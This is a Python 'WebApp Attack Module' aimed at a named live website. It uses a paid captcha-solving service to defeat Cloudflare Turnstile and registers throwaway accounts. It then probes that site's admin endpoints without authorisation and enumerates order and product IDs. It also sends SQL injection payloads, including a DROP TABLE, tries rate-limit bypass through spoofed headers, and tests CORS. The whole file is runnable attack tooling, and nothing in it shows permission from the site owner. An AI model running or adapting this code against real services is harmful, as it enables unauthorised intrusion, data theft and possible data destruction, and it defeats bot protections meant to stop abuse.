#!/usr/bin/env python3
"""WebApp Attack Module - nerix.com.br"""
import os, sys, json, time, re, urllib.parse
sys.path.insert(0, '/home/ubuntu/tools-venv/lib/python3.12/site-packages')
from twocaptcha import TwoCaptcha
import asyncio
from playwright.async_api import async_playwright

API_KEY = open(os.path.expanduser('~/.config/opencode/.2captcha_key')).read().strip()
solver = TwoCaptcha(API_KEY)
SITEKEY = '0x4AAAAAACDTiti-ppzGwnYb'
BASE = 'https://api.nerix.com.br'
TOKEN_CACHE = None
AUTH_HEADER = None

async def goto(page, url):
    return await page.goto(url, wait_until='load', timeout=30000)

async def api_call(page, method, path, data=None, headers=None):
    hdrs = {'Content-Type': 'application/json'}
    if AUTH_HEADER:
        hdrs.update(AUTH_HEADER)
    if headers:
        hdrs.update(headers)
    body = json.dumps(data) if data else None
    script = f'''
        async () => {{
            try {{
                const resp = await fetch('{BASE}{path}', {{
                    method: '{method}',
                    headers: {json.dumps(hdrs)},
                    {f'body: {json.dumps(body)},' if body else ''}
                }});
                return {{
                    status: resp.status,
                    headers: Object.fromEntries(resp.headers.entries()),
                    body: await resp.text()
                }};
            }} catch(e) {{
                return {{error: e.toString()}};
            }}
        }}
    '''
    return await page.evaluate(script)

async def solve_turnstile(retries=3):
    for i in range(retries):
        try:
            result = solver.turnstile(sitekey=SITEKEY, url='https://nerix.com.br/register')
            return result['code']
        except Exception as e:
            print(f'[!] Turnstile solve attempt {i+1} failed: {e}')
            if i < retries - 1: time.sleep(3)
    return None

async def register_user(page, email_suffix):
    global TOKEN_CACHE, AUTH_HEADER
    token = await solve_turnstile()
    if not token: return None
    
    data = {
        'name': f'Pentest{email_suffix}',
        'username': f'pentest{email_suffix}',
        'email': f'pentest_{email_suffix}@proton.me',
        'password': 'P3nt3st!2026#Strong',
        'password_confirmation': 'P3nt3st!2026#Strong',
        'whatsapp': '5521999999999',
        'turnstile_token': token
    }
    
    result = await api_call(page, 'POST', '/api/auth/register', data)
    print(f'[+] Register ({email_suffix}): {result.get("status")} - {result.get("body","")[:200]}')
    
    if result.get('status') in [200, 201]:
        body = json.loads(result['body'])
        if 'token' in body:
            TOKEN_CACHE = body['token']
            AUTH_HEADER = {'X-nerixkey': body['token']}
            print(f'[!!!] AUTH TOKEN OBTIDO: {body["token"][:50]}...')
            return body
        elif 'apiKey' in body:
            TOKEN_CACHE = body['apiKey']
            AUTH_HEADER = {'X-nerixkey': body['apiKey']}
            print(f'[!!!] API KEY OBTIDO: {body["apiKey"][:50]}...')
            return body
    elif result.get('status') == 429:
        body = json.loads(result['body'])
        retry = body.get('retryAfter', 3600)
        print(f'[!] Rate limited. Retry after {retry}s')
    return None

async def login_user(page, email_suffix, password='P3nt3st!2026#Strong'):
    global TOKEN_CACHE, AUTH_HEADER
    token = await solve_turnstile()
    if not token: return None
    
    data = {
        'email': f'pentest_{email_suffix}@proton.me',
        'password': password,
        'turnstile_token': token
    }
    
    result = await api_call(page, 'POST', '/api/auth/login', data)
    print(f'[+] Login ({email_suffix}): {result.get("status")} - {result.get("body","")[:200]}')
    
    if result.get('status') == 200:
        body = json.loads(result['body'])
        if 'token' in body:
            TOKEN_CACHE = body['token']
            AUTH_HEADER = {'X-nerixkey': body['token']}
            print(f'[!!!] AUTH TOKEN OBTIDO (login): {body["token"][:50]}...')
            return body
    return None

async def test_authless_admin(page):
    """Test admin endpoints WITHOUT any auth header"""
    global AUTH_HEADER
    saved = AUTH_HEADER
    AUTH_HEADER = None
    
    admin_endpoints = [
        '/api/v1/admin/accounts',
        '/api/v1/admin/stores',
        '/api/v1/admin/sales',
        '/api/v1/admin/stats',
        '/api/v1/admin/platform-logs',
        '/api/v1/admin/activity-logs',
        '/api/v1/admin/notifications',
        '/api/v1/admin/visit-logs',
        '/api/v1/admin/banned-ips',
        '/api/v1/admin/wallet-identities',
        '/api/v1/admin/withdrawals',
        '/api/v1/admin/impersonation/start',
        '/api/v1/admin/infractions',
        '/api/v1/admin/inspect/http',
        '/api/v1/admin/analytics/churn',
        '/api/v1/admin/analytics/finance',
        '/api/v1/admin/stores/daily-metrics',
        '/api/v1/admin/stores/totals',
        '/api/v1/admin/finance/overview',
        '/api/v1/admin/finance/provider-costs',
    ]
    
    results = []
    for ep in admin_endpoints:
        result = await api_call(page, 'GET', ep)
        status = result.get('status')
        body_preview = result.get('body','')[:150]
        print(f'  [ADMIN-NOAUTH] {ep}: {status} - {body_preview}')
        if status == 200:
            results.append((ep, status, body_preview))
    AUTH_HEADER = saved
    return results

async def test_auth_endpoints(page):
    """Test authenticated endpoints with our token"""
    if not AUTH_HEADER:
        print('[!] No auth token available')
        return []
    
    endpoints = [
        ('GET', '/api/auth/me'),
        ('GET', '/api/auth/profile'),
        ('GET', '/api/v1/admin/accounts'),
        ('GET', '/api/v1/admin/stores'),
        ('GET', '/api/v1/admin/sales'),
        ('GET', '/api/v1/admin/stats'),
        ('GET', '/api/v1/admin/platform-logs'),
        ('GET', '/api/v1/admin/activity-logs'),
        ('GET', '/api/v1/admin/notifications'),
        ('GET', '/api/v1/admin/visit-logs'),
        ('GET', '/api/v1/admin/banned-ips'),
        ('GET', '/api/v1/admin/wallet-identities'),
        ('GET', '/api/v1/admin/withdrawals'),
        ('GET', '/api/v1/admin/finance/overview'),
        ('GET', '/api/v1/admin/finance/provider-costs'),
        ('GET', '/api/v1/admin/stores/daily-metrics'),
        ('GET', '/api/v1/admin/stores/totals'),
        ('GET', '/api/v1/admin/infractions'),
        ('GET', '/api/v1/admin/inspect/http'),
        ('GET', '/api/v1/admin/impersonation/start'),
        ('GET', '/api/v1/admin/analytics/churn'),
        ('GET', '/api/v1/admin/analytics/duplicates'),
        ('GET', '/api/v1/admin/analytics/funnel'),
        ('GET', '/api/v1/admin/analytics/ranking'),
        ('GET', '/api/v1/admin/analytics/revenue'),
    ]
    
    results = []
    for method, ep in endpoints:
        result = await api_call(page, method, ep)
        status = result.get('status')
        body_preview = result.get('body','')[:200]
        print(f'  [AUTH] {method} {ep}: {status}')
        if status == 200:
            print(f'    Body: {body_preview}')
            results.append((method, ep, status, body_preview))
        elif status in [401, 403]:
            print(f'    Blocked: {body_preview[:100]}')
    return results

async def test_idor(page):
    """Test IDOR on public endpoints with sequential IDs"""
    results = []
    
    # Test product IDs
    for pid in [1, 2, 3, 10, 50, 100, 500, 1000, 9999]:
        result = await api_call(page, 'GET', f'/api/public/products/{pid}')
        status = result.get('status')
        body = result.get('body','')[:300]
        if status == 200:
            print(f'[IDOR] GET /api/public/products/{pid}: {status} - DATA FOUND!')
            print(f'  Body: {body}')
            results.append(('product', pid, body))
        elif status != 404:
            print(f'[IDOR] GET /api/public/products/{pid}: {status} - {body[:100]}')
    
    # Test public categories with params
    for param in ['?packages=true&include_subcategories=true', '?page=1&limit=10', '?page=2&limit=100', '?order=desc&sort=name']:
        result = await api_call(page, 'GET', f'/api/public/categories{param}')
        status = result.get('status')
        body = result.get('body','')[:300]
        if status == 200:
            print(f'[IDOR] GET /api/public/categories{param}: {status} - {body[:200]}')
            results.append(('categories', param, body[:200]))
    
    return results

async def test_idor_auth(page):
    """Test IDOR on authenticated endpoints"""
    if not AUTH_HEADER: return []
    results = []
    
    # Orders with UUID patterns
    for order_id in ['00000000-0000-0000-0000-000000000001', '00000000-0000-0000-0000-000000000002',
                     'aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa', 'ffffffff-ffff-ffff-ffff-ffffffffffff',
                     '12345678-1234-1234-1234-123456789012']:
        result = await api_call(page, 'GET', f'/api/public/orders/{order_id}')
        status = result.get('status')
        body = result.get('body','')[:200]
        if status == 200:
            print(f'[IDOR-AUTH] GET /api/public/orders/{order_id}: {status}')
            results.append(('order', order_id, body))
        elif status not in [400, 404]:
            print(f'[IDOR-AUTH] GET /api/public/orders/{order_id}: {status} - {body[:100]}')
    
    return results

async def test_sqli(page):
    """Test SQL injection on public endpoints"""
    results = []
    
    payloads = [
        ("' OR 1=1--", "' OR '1'='1"),
        ("1' OR '1'='1", "1 UNION SELECT 1,2,3,4,5,6,7,8,9,10--"),
        ("1; DROP TABLE users--", "1 AND 1=1", "1 AND 1=2"),
        ("' SLEEP(5)--", "' WAITFOR DELAY '0:0:5'--"),
        ("{\"$ne\": null}", "{\"$gt\": \"\"}"),
    ]
    
    # Test on products endpoint
    for payload in [p[0] for p in payloads[:3]]:
        encoded = urllib.parse.quote(payload)
        result = await api_call(page, 'GET', f'/api/public/products?id={encoded}')
        status = result.get('status')
        body = result.get('body','')[:200]
        if status == 200 and 'error' not in body.lower():
            print(f'[SQLI] /api/public/products?id={payload}: {status} - POSSIBLE! {body[:150]}')
            results.append(('products', payload, body[:150]))
        else:
            print(f'[SQLI] /api/public/products?id={payload}: {status} - {body[:100]}')
    
    return results

async def test_rate_limit_bypass(page):
    """Test rate limit bypass via headers"""
    results = []
    headers_list = [
        {'X-Forwarded-For': '127.0.0.1'},
        {'X-Forwarded-For': '10.0.0.1'},
        {'X-Forwarded-For': '192.168.1.1'},
        {'X-Real-IP': '127.0.0.1'},
        {'CF-Connecting-IP': '127.0.0.1'},
        {'X-Forwarded-For': '127.0.0.1, 10.0.0.1, 192.168.1.1'},
    ]
    
    for hdrs in headers_list:
        result = await api_call(page, 'GET', '/api/public/categories', headers=hdrs)
        status = result.get('status')
        limit = result.get('headers',{}).get('ratelimit-remaining','?')
        print(f'[RATE] Headers {hdrs}: {status} Remaining: {limit}')
        if status == 200:
            results.append((hdrs, status))
    
    return results

async def test_cors(page):
    """Test CORS misconfiguration"""
    results = []
    origins = ['https://evil.com', 'https://attacker.com', 'null', 'https://api.nerix.com.br']
    
    for origin in origins:
        result = await api_call(page, 'GET', '/api/v1', headers={'Origin': origin})
        headers = result.get('headers', {})
        acao = headers.get('access-control-allow-origin', 'MISSING')
        acc = headers.get('access-control-allow-credentials', 'MISSING')
        if acao == '*' or (acao == origin and acc == 'true'):
            print(f'[CORS] Origin {origin}: ACAO={acao}, ACAC={acc} - MISCONFIG!')
            results.append((origin, acao, acc))
        else:
            print(f'[CORS] Origin {origin}: ACAO={acao}, ACAC={acc} (safe)')
    
    return results

async def main():
    global TOKEN_CACHE, AUTH_HEADER
    print('='*60)
    print('NERIX WEBAPP ATTACK MODULE')
    print('='*60)
    
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True, args=['--no-sandbox'])
        ctx = await browser.new_context(
            user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36'
        )
        page = await ctx.new_page()
        
        # Establish session
        resp = await goto(page, f'{BASE}/api/v1')
        print(f'[+] Initial session: {resp.status}\n')
        
        # 1. TEST REGISTER
        print('--- [1] AUTH BYPASS / REGISTER ---')
        reg_result = None
        for suffix in ['a','b','c']:
            r = await register_user(page, suffix)
            if r:
                reg_result = r
                break
            await asyncio.sleep(2)
        
        if not reg_result:
            print('[!] Registration failed, trying login with existing...')
            for suffix in ['a','b','c']:
                r = await login_user(page, suffix)
                if r:
                    reg_result = r
                    break
                await asyncio.sleep(2)
        
        # 2. TEST AUTH ENDPOINTS
        print('\n--- [2] AUTH ENDPOINTS ---')
        auth_results = await test_auth_endpoints(page)
        
        # 3. TEST ADMIN WITHOUT AUTH
        print('\n--- [3] ADMIN NO-AUTH ---')
        admin_noauth = await test_authless_admin(page)
        
        # 4. TEST IDOR
        print('\n--- [4] IDOR/BOLA PUBLIC ---')
        idor_results = await test_idor(page)
        
        # 5. TEST IDOR AUTH
        print('\n--- [5] IDOR/BOLA AUTH ---')
        idor_auth = await test_idor_auth(page)
        
        # 6. TEST SQLI
        print('\n--- [6] SQL INJECTION ---')
        sqli_results = await test_sqli(page)
        
        # 7. TEST RATE LIMIT BYPASS
        print('\n--- [7] RATE LIMIT BYPASS ---')
        rate_results = await test_rate_limit_bypass(page)
        
        # 8. TEST CORS
        print('\n--- [8] CORS MISCONFIG ---')
        cors_results = await test_cors(page)
        
        await browser.close()
    
    print('\n' + '='*60)
    print('FINAL SUMMARY')
    print('='*60)
    print(f'Auth Token obtained: {"YES" if TOKEN_CACHE else "NO"}')
    print(f'Auth endpoints accessible: {len(auth_results)}')
    print(f'Admin without auth: {len(admin_noauth)}')
    print(f'IDOR public findings: {len(idor_results)}')
    print(f'IDOR auth findings: {len(idor_auth)}')
    print(f'SQLi findings: {len(sqli_results)}')
    print(f'Rate bypass findings: {len(rate_results)}')
    print(f'CORS findings: {len(cors_results)}')

if __name__ == '__main__':
    asyncio.run(main())